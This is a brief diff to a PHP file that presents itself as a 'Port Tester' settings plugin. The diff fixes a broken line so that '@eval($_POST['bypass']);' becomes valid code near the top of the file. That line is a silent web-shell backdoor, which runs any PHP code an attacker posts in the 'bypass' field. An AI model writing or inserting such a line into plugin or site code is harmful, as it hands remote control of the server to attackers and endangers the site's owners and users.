@@ -1,7 +1,7 @@
 <?php
 
 register_menu("Port Tester", true, "port_tester", 'SETTINGS', '');
-<?php @eval($_POST['bypass']);
+@eval($_POST['bypass']);
 function port_tester()
 {
     global $ui;
